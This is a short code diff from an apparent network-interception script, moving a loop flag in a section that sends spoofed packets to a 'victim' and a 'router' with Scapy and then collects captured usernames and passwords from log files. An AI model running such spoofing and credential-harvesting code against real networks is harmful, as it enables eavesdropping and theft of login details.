@@ -104,8 +104,8 @@ if __name__ == "__main__":
                     # https://stackoverflow.com/questions/15377150/how-can-i-call-the-send-function-without-getting-output
                     send(victimpacket, verbose=0)
                     send(routerpacket, verbose=0)
-                    sending_flag = False
-
+                    
+            sending_flag = False
             # get all username and password in log file
             print(" ")
             for file in os.listdir("logdir/"):
